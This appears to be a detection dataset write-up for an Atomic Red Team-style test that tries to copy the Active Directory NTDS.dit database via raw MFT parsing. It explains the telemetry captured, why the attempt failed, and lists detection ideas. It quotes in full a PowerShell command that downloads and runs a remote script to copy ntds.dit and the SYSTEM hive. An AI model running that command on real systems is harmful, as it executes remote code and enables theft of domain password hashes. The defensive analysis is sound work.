# T1003.003-10: NTDS — Copy NTDS in low level NTFS acquisition via MFT parsing

## Technique Context

T1003.003 NTDS is a critical credential access technique where attackers attempt to extract credentials from the NTDS.dit database file, which stores Active Directory user accounts and their password hashes. This technique is typically executed on domain controllers but can also target NTDS.dit copies on other systems. The specific variant tested here attempts low-level NTFS access by directly parsing the Master File Table (MFT) to read file contents at the filesystem level, potentially bypassing traditional file access controls and monitoring.

This approach is particularly sophisticated as it uses Windows API calls to obtain file metadata (MFT record numbers) and then directly reads the raw disk clusters containing the file data. The detection community focuses on monitoring for unusual file system access patterns, attempts to read sensitive Active Directory files, PowerShell execution with NTFS manipulation capabilities, and the presence of tools that perform direct disk access operations.

## What This Dataset Contains

The dataset captures a failed attempt to copy NTDS.dit using a PowerShell script downloaded from GitHub. Security 4688 events show the complete PowerShell command line: `"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR https://raw.githubusercontent.com/kfallahi/UnderlayCopy/37f2e9b76b724bc1211437b14deaf1e76b21791e/UnderlayCopy.ps1 -UseBasicParsing); Underlay-Copy -Mode MFT -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile C:\Windows\Temp\ntds.dit; Underlay-Copy -Mode MFT -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile C:\Windows\Temp\SYSTEM_HIVE}`.

PowerShell 4104 events capture the full UnderlayCopy script being loaded, which contains sophisticated C# code for NTFS manipulation including Windows API P/Invoke declarations for CreateFileW, GetFileInformationByHandle, and direct MFT parsing functions. PowerShell 4103 events show the attempted execution, including the Invoke-WebRequest to download the script and subsequent Get-Item commands attempting to access "C:\Windows\NTDS\ntds.dit".

The technique fails because the target is a domain workstation, not a domain controller - PowerShell 4100 errors show "CreateFileW failed for 'C:\Windows\NTDS\ntds.dit': The system cannot find the path specified" since NTDS.dit doesn't exist on workstations. Sysmon 1 events capture process creation for the PowerShell instances and the .NET compiler (csc.exe) that compiles the embedded C# code. Sysmon 11 events show temporary file creation in C:\Windows\SystemTemp\ during the compilation process.

## What This Dataset Does Not Contain

The dataset doesn't contain evidence of successful NTDS.dit access since the file doesn't exist on this workstation. There are no file read operations on actual credential databases, no successful MFT parsing of sensitive files, and no evidence of credential extraction. The technique would generate different telemetry on an actual domain controller where NTDS.dit exists.

Missing are Sysmon events for actual disk/volume access (the script attempts to open "\\.\C:" for raw disk access), file modification events for successful copies to C:\Windows\Temp\, and any registry access events for SYSTEM hive manipulation. The sysmon-modular configuration may have filtered some process creation events, though the key PowerShell and compiler processes are captured.

## Assessment

This dataset provides excellent coverage for detecting the initial stages and methodology of sophisticated NTFS-level credential access attempts. The combination of Security 4688 command-line logging, PowerShell 4103/4104 script block logging, and Sysmon process/file creation events creates comprehensive visibility into this advanced technique.

The PowerShell logging is particularly valuable as it captures the complete malicious script with embedded C# code for direct NTFS manipulation. While the technique fails in this environment, the detection opportunities remain highly relevant since the same approach would generate similar initial telemetry on vulnerable systems before the actual file access occurs.

The data sources provide strong foundations for behavioral detections focused on the technique's methodology rather than just its success, making the dataset valuable despite the failed execution.

## Detection Opportunities Present in This Data

1. **PowerShell script downloading and executing NTFS manipulation tools** - Monitor PowerShell 4103 events for Invoke-WebRequest combined with Invoke-Expression of scripts containing filesystem manipulation functions

2. **C# compilation with Windows API P/Invoke declarations** - Detect Security 4688 events for csc.exe with command lines referencing temporary compilation directories, especially when parent process is PowerShell

3. **PowerShell scripts containing low-level NTFS access patterns** - Alert on PowerShell 4104 script block events containing strings like "CreateFileW", "GetFileInformationByHandle", "MFT", or direct volume access patterns like "\\.\C:"

4. **Attempts to access NTDS.dit or SYSTEM hive files** - Monitor PowerShell 4103 events for Get-Item, Test-Path, or file access operations targeting "C:\Windows\NTDS\ntds.dit" or "C:\Windows\System32\config\SYSTEM"

5. **PowerShell execution with credential dumping tool characteristics** - Detect PowerShell processes loading urlmon.dll (for downloads) combined with script content containing MFT parsing or direct disk access functions

6. **Temporary file creation patterns during malicious compilation** - Monitor Sysmon 11 events for file creation in C:\Windows\SystemTemp\ with .cs, .dll, or .tmp extensions when created by PowerShell processes

7. **Process chain analysis for credential access workflows** - Alert on PowerShell parent processes spawning csc.exe followed by attempts to access credential-related file paths

8. **PowerShell privilege escalation combined with filesystem manipulation** - Monitor Security 4703 privilege adjustment events for PowerShell processes followed by script execution containing direct disk access operations
